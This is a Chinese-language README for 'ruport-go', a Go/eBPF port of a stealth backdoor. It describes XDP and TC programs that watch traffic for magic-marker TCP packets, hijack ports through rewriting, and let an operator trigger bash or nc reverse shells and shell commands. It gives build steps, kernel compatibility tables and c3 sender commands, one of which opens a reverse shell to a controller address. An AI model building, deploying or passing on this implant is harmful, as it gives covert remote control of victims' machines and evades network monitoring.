# ruport-go

基于 Golang + [cilium/ebpf](https://github.com/cilium/ebpf) 实现的端口复用控制程序，
是 [ruport](../ruport)（C + libbpf）的功能等价移植。

仅支持 Linux（Debian/Ubuntu 系发行版）。**不要在 Windows 下编译**，构建与测试需在
Linux 上执行 `make`。内核版本要求与"一次编译、跨发行版运行"的适应性说明见
[内核要求与一次编译的适应性](#内核要求与一次编译的适应性)。

## 功能

与原 ruport 项目一致：

- **XDP 程序**（SKB 模式，`XDP_PASS` 不影响正常业务）：解析网卡上的 IPv4/TCP 包，
  识别 TCP payload 前 12 字节魔术标记（`s1² + s2² = s3`，小端），命中后解析 124
  字节指令消息（`ins/cip/cport/connport/nativeport/ext[100]`），以
  `(cip<<16)+cport` 为 key 存入 `message_map`；
- **TC 程序**（clsact，ingress + egress）：维护 `router_map`，入站命中路由时把
  目的端口改写为本地真实服务端口 `nativeport`（并更新校验和），出站命中时把源端口
  改写回出网端口 `connport`，实现端口复用；
- **控制程序 ruport**：每秒轮询 `message_map`，按指令添加/删除路由，执行反弹
  连接（bash / nc）、执行 shell 命令等功能；
- **指令发送端 c3**：构造同样的 124 字节魔术包发到被控端开放端口，
  命令行参数与原 `insTool/c3.py` 完全一致。

与原项目的差异（仅技术栈层面，不改功能语义）：

- 用户态由 C/libbpf 换成 Go + cilium/ebpf，skeleton 换成 bpf2go 生成的绑定；
- 经典 TC clsact 的挂载 cilium/ebpf 不直接提供，使用 vishvananda/netlink 创建
  qdisc/filter（等价于原 `bpf_tc_hook_create`/`bpf_tc_attach`，priority=1 handle=1）；
- pidhide（进程隐藏）在原项目 main() 中已注释禁用，本项目不移植；
  `-H` 参数仅为命令行兼容保留，无实际作用；
- `-p` 参数与原版一致：解析并校验，但不参与后续逻辑。

## 目录结构

```
bpf/                  eBPF C 源码（由 bpf2go 编译）
  common.h            Message/Router 结构与常量（对应原 types.h）
  ruport_xdp.bpf.c    XDP 指令嗅探（对应原 ruport.xdp.c）
  ruport_tc.bpf.c     TC 端口复用改写（对应原 ruport.tc.c）
internal/bpf/         bpf2go 生成的 Go 绑定（make generate 产生）+ 加载封装
internal/control/     指令处理（路由增删、反弹、shell 执行，对应原 ruport.c 逻辑）
cmd/ruport/           控制主程序
cmd/c3/               指令发送端（对应原 insTool/c3.py）
```

## 环境与编译

Ubuntu 24.04（已在原项目验证过的发行版）：

```bash
sudo apt install golang-go clang libbpf-dev make
```

（Go 版本需 >= 1.24，若仓库版本过旧请自行安装新版）

编译：

```bash
make
```

`make` 自动完成：`go mod tidy` -> `bpf2go` 编译 `bpf/*.bpf.c` 并在
`internal/bpf/` 下生成 Go 绑定 -> `go build` 产出 `ruport` 与 `c3`。

清理：

```bash
make clean
```

## 内核要求与一次编译的适应性

### 功能依赖清单

程序实际用到的 eBPF 功能及其主线内核最低版本（逐项核对自
`bpf/*.bpf.c`、`cmd/ruport/main.go`）：

| 功能 | 使用处 | 最低内核 |
|---|---|---|
| XDP 程序类型（generic/SKB 模式挂载） | `ruport_xdp.bpf.c` + `link.AttachXDP(GenericMode)` | 4.8 |
| TC（SCHED_CLS）程序类型 | `ruport_tc.bpf.c` | 4.1 |
| clsact qdisc（netlink 挂载） | `attachTcFilters`（egress/ingress filter） | 4.5 |
| `BPF_MAP_TYPE_HASH` | `message_map` / `router_map` | 3.18 |
| helper `bpf_map_lookup_elem` / `bpf_map_update_elem` | XDP/TC | 3.19 |
| helper `bpf_skb_store_bytes` / `bpf_l4_csum_replace` / `bpf_csum_diff` | TC 端口改写与校验和 | 4.1 |
| helper `bpf_trace_printk` | `bpfprint` 宏（license 已声明 GPL） | 4.1 |
| 程序自身 BTF 上载（`BPF_BTF_LOAD`，.o 以 `-g` 编译） | 加载时由 cilium/ebpf 提交 | 4.18 |
| XDP link 化挂载（可选路径） | `AttachXDP` 自动选择：5.8+ 走 link，老内核回退旧式 attach | 4.8 |
| memlock 解除 | `rlimit.RemoveMemlock()`（<5.11 必需，5.11+ 起 memcg 计费、调用无害） | — |

### 内核要求结论

- **理论最低**：4.8（上表最大值；4.8~4.17 区间依赖加载器在无 BTF
  syscall 时跳过程序 BTF，**未验证，不建议**）；
- **推荐基线**：**≥ 5.4**——主流发行版自此默认开启
  `CONFIG_DEBUG_INFO_BTF=y`，程序 BTF 上载无忧；
- 未使用 ringbuf / tcx / fentry / CO-RE 等高版本特性，无额外要求。

### Ubuntu 兼容矩阵

| 发行版 | 默认内核 | 运行 24.04 编译的二进制 | 说明 |
|---|---|---|---|
| Ubuntu 24.04 | 6.8（HWE 至 6.11） | ✅ 已验证口径（本项目开发/构建环境） | 构建与运行基线 |
| Ubuntu 22.04 | 5.15（HWE 至 6.8） | ✅ 满足自查条件即可运行 | 5.15 ≥ 5.4 基线，BTF 默认开启 |
| Ubuntu 20.04 | 5.4 | ⚠️ 理论可用，未实测 | 恰为基线版本；memlock 路径生效 |
| Ubuntu 18.04 | 4.15 | ❌ 不支持 | < 4.18，BTF 上载不可用，且未验证 |

### 为什么"一次编译、跨发行版运行"成立

1. **纯 Go 静态二进制**：控制端 `ruport` 与发送端 `c3` 均无 cgo /
   glibc 依赖，二进制与构建机发行版、libc 版本无关；
2. **eBPF 字节码内嵌且双端序**：bpf2go 默认生成 `bpfel` + `bpfeb`
   两套 `.o` 并按架构构建标签自动选用——同一个 `make` 产物在小端
   架构（amd64/arm64 等）通用；构建机 clang 版本不约束目标内核
   （BPF 指令集是稳定 ISA）；
3. **无 CO-RE 重定位**：程序只使用 UAPI 稳定结构（`iphdr/tcphdr`
   等），不读取内核内部结构体，因此**不依赖目标内核的 BTF**；
   仅程序自身 BTF 需要目标内核支持 `BPF_BTF_LOAD`（4.18+）；
4. **挂载自动适配**：XDP 在 5.8+ 自动走 link、老内核回退旧式
   attach；TC 走经典 clsact（4.5+ 无版本分歧）；<5.11 内核的
   memlock 已在代码中处理。

### 目标机运行前自查（三条命令）

```bash
uname -r                                   # 内核版本 ≥ 5.4（推荐基线）
ls -l /sys/kernel/btf/vmlinux              # 存在即可（程序 BTF 上载无忧）
sudo bpftool feature probe full | grep -E "xdp|clsact"   # 权限与能力最终确认
```

### 注意事项

- 需 **root**（或 `CAP_BPF` + `CAP_NET_ADMIN`，5.8+ 细分 capability）；
- XDP 使用 **generic/SKB 模式**，不挑网卡驱动（native 模式非必需）；
- 内核需启用 `CONFIG_BPF_SYSCALL`（Ubuntu 默认开启）；
- 与原 C 版一致，本程序未使用任何高版本特性作为前提；
- **网卡 TX 校验和卸载必须保持开启（系统默认）**：egress 方向只改写回包源端口、
  不修改 TCP 校验和（本机产生的包为 CHECKSUM_PARTIAL，由网卡对改写后的头部
  求和）。若执行 `ethtool -K <网卡> tx off`，回包校验和会出错、连接无法建立。

## 运行

```bash
sudo ./ruport -i eth0
```

- `-i` —— 网络接口名称。不指定时自动读取 `/proc/net/dev`，选择发送字节数最多的
  非 `lo` 网卡（与原版一致，可能获取不到，建议显式指定）；
- `-p` —— 端口（解析校验，不参与逻辑，兼容保留）；
- `-H` —— 兼容保留，无实际作用（原版 pidhide 已禁用）。

程序收到 SIGINT 时卸载 XDP 与 TC 挂载后退出。

指令发送（用法与原 c3.py 一致，`./c3 -h` 查看完整帮助）：

```bash
# 添加路由：目标 192.168.1.2:80，控制端 192.168.1.3:3333，出网端口 80，功能端口 22
./c3 -t 192.168.1.2 -p 80 -1 -S 192.168.1.3 -P 3333 -x 80 -y 22

# bash 反弹
./c3 -t 192.168.1.2 -p 80 -2 -S 192.168.1.3 -P 2222 -x 80 -e bash

# 删除路由
./c3 -t 192.168.1.2 -p 80 -d -1 -S 192.168.1.3 -P 3333 -x 80
```

nc 反弹要求被控端程序同目录下存在 `nc` 可执行文件（与原版一致）。
